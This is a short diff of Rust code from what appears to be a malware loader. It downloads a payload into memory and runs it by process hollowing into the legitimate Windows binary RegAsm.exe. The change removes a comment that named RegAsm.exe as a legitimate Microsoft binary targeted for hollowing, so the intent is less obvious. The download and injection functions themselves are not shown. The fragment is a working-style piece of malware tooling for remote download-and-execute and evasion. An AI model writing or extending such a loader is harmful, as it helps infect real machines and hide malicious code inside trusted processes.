@@ -17,7 +17,6 @@ pub async fn run_loader() {
     match download_payload(url).await {
         Ok(bytes) => {
             info!("payload downloaded to memory ({} bytes)", bytes.len());
-            // Target a legitimate Microsoft binary for hollowing
             let target = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe";
             match execute_payload(&bytes, target) {
                 Ok(_) => info!("payload executed via process hollowing into {}", target),
